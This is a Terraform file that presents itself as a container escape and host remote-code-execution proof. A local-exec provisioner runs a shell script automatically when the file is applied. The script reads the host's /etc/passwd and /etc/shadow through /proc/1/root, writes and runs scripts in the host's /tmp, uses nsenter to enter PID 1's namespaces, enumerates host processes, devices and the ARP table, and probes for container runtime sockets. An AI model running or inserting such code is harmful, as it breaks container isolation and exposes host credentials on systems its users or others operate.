# Container Escape and Host RCE Proof
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Advanced Container Escape and Host RCE
resource "null_resource" "container_escape_rce" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== ADVANCED CONTAINER ESCAPE AND HOST RCE ==="
      echo "Attempting multiple escape vectors for host command execution"
      
      # Method 1: Direct host filesystem manipulation via /proc/1/root
      echo "[*] Method 1: Host filesystem access via /proc/1/root"
      if [ -d "/proc/1/root" ]; then
        echo "[+] /proc/1/root accessible"
        
        # Read host files directly
        if [ -r "/proc/1/root/etc/passwd" ]; then
          echo "[!] SUCCESS: Host /etc/passwd readable!"
          echo "=== HOST USERS ==="
          cat /proc/1/root/etc/passwd
          echo "=================="
        fi
        
        # Try to write to host filesystem
        echo "[*] Attempting to write to host filesystem..."
        echo "CONTAINER_ESCAPE_PROOF_$$(date)" > /proc/1/root/tmp/escape_proof.txt 2>/dev/null && echo "[!] SUCCESS: Written to host /tmp/" || echo "[-] Write to host failed"
        
        # Check host shadow file
        if [ -r "/proc/1/root/etc/shadow" ]; then
          echo "[!] CRITICAL: Host /etc/shadow accessible!"
          head -5 /proc/1/root/etc/shadow
        fi
      fi
      
      # Method 2: Host process namespace manipulation
      echo "[*] Method 2: Process namespace escape"
      if [ -r "/proc/1/cmdline" ]; then
        echo "[+] Host PID 1 cmdline: $$(cat /proc/1/cmdline | tr '\0' ' ')"
      fi
      
      # Check if we can access host processes
      echo "[*] Host processes accessible via /proc:"
      for pid in 1 2 3 4 5; do
        if [ -r "/proc/$$pid/comm" ]; then
          comm=$$(cat /proc/$$pid/comm 2>/dev/null)
          cmdline=$$(cat /proc/$$pid/cmdline 2>/dev/null | tr '\0' ' ')
          echo "  PID $$pid: $$comm ($$cmdline)"
        fi
      done
      
      # Method 3: Container runtime escape via host binaries
      echo "[*] Method 3: Execute host binaries directly"
      if [ -x "/proc/1/root/bin/bash" ]; then
        echo "[+] Host bash executable found - attempting execution"
        # Try different execution methods
        echo "ESCAPE_TEST" | /proc/1/root/bin/bash -c 'echo "[!] HOST BASH EXECUTION: $$(id) on $$(hostname)"' 2>/dev/null || echo "[-] Direct execution failed"
      fi
      
      # Method 4: Memory-based host access
      echo "[*] Method 4: Host memory and device access"
      if [ -r "/proc/1/root/proc/version" ]; then
        echo "[!] Host kernel version: $$(cat /proc/1/root/proc/version)"
      fi
      
      # Check host devices
      if [ -d "/proc/1/root/dev" ]; then
        echo "[*] Host devices accessible:"
        ls -la /proc/1/root/dev/ | head -10
      fi
      
      # Method 5: Host network namespace escape
      echo "[*] Method 5: Host network information"
      if [ -r "/proc/1/root/proc/net/arp" ]; then
        echo "[*] Host ARP table:"
        cat /proc/1/root/proc/net/arp
      fi
      
      # Method 6: Try nsenter if available
      echo "[*] Method 6: nsenter host namespace entry"
      if command -v nsenter >/dev/null 2>&1; then
        echo "[+] nsenter available - attempting namespace escape"
        nsenter -t 1 -m -p -n -u -i /bin/bash -c 'echo "[!] NSENTER SUCCESS: $$(id) on $$(hostname)"' 2>/dev/null || echo "[-] nsenter failed"
      fi
      
      # Method 7: Direct host command injection via /proc/1/root
      echo "[*] Method 7: Host command execution via filesystem"
      if [ -w "/proc/1/root/tmp" ]; then
        echo "[+] Host /tmp writable - creating execution script"
        cat > /proc/1/root/tmp/escape_cmd.sh << 'EOF'
#!/bin/bash
echo "[!] HOST SCRIPT EXECUTION SUCCESS!"
echo "Host ID: $$(id)"
echo "Host Hostname: $$(hostname)"
echo "Host Uptime: $$(uptime)"
echo "Host Kernel: $$(uname -a)"
echo "Host Network: $$(ip a | grep inet)"
echo "Host Processes: $$(ps aux | wc -l)"
EOF
        chmod +x /proc/1/root/tmp/escape_cmd.sh 2>/dev/null
        
        # Try to execute the script
        /proc/1/root/tmp/escape_cmd.sh 2>/dev/null || echo "[-] Script execution failed"
      fi
      
      # Method 8: Container runtime socket access
      echo "[*] Method 8: Container runtime socket enumeration"
      for sock in /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock; do
        if [ -S "$$sock" ]; then
          echo "[!] Container runtime socket found: $$sock"
        fi
      done
      
      echo "[*] Container escape summary:"
      echo "  Container ID: $$(hostname)"
      echo "  Container User: $$(id)"
      echo "  Container PID: $$$$"
      echo "  Container IP: $$(hostname -i 2>/dev/null || echo 'N/A')"
      echo "  Escape attempts completed - check above for successful host access"
      
      echo "=== ESCAPE ANALYSIS COMPLETE ==="
    EOT
  }
}

output "escape_status" {
  value = "Container escape attempt completed - check logs for host command execution proof"
  depends_on = [null_resource.container_escape_rce]
}
